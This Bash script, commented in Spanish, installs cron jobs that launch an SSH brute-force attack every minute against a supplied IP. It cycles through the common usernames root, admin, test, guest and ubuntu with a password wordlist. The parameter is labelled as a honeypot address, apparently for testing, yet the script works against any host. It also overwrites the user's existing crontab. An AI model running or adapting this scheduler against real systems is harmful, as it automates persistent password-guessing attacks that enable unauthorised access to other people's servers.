#!/bin/bash
# Script para agendar un ataque de fuerza bruta SSH vía cron
# Author: Miguel Pacheco y Rolando Quiroz
# Uso: ./schedule-ssh-bruteforce.sh <IP_HONEYPOT>
# Agenda el script ssh-bruteforce.sh para cada usuario en la lista cada minuto
# Usuarios: root, admin, test, guest, ubuntu
# El diccionario de contraseñas es passwords.txt en el mismo folder
# Los logs se guardan en /tmp/ssh_bruteforce_<usuario>.log
# Para ver las tareas agendadas: crontab -l
# Para eliminar las tareas: crontab -r

if [ $# -ne 1 ]; then
  echo "Uso: $0 <IP_HONEYPOT>"
  echo "Ejemplo: $0 1.2.3.4"
  exit 1
fi

IP="$1"
USER_LIST=(root admin test guest ubuntu)
WORDLIST="$(dirname "$0")/passwords.txt"
BRUTE_SCRIPT="$(dirname "$0")/ssh-bruteforce.sh"

CRON_FILE="/tmp/ssh_bruteforce_cron_$$.tmp"

# Genera las líneas de cron para cada usuario (cada minuto)
: > "$CRON_FILE"
for USER in "${USER_LIST[@]}"; do
  echo "* * * * * bash $BRUTE_SCRIPT $IP $USER $WORDLIST >> /tmp/ssh_bruteforce_${USER}.log 2>&1" >> "$CRON_FILE"
done

# Instala las tareas en el cron del usuario actual
crontab "$CRON_FILE"
rm "$CRON_FILE"

echo "Tareas de fuerza bruta SSH agendadas para IP $IP y usuarios: ${USER_LIST[*]}"
echo "Se ejecutarán cada minuto. Para ver las tareas: crontab -l. Para eliminar: crontab -r"
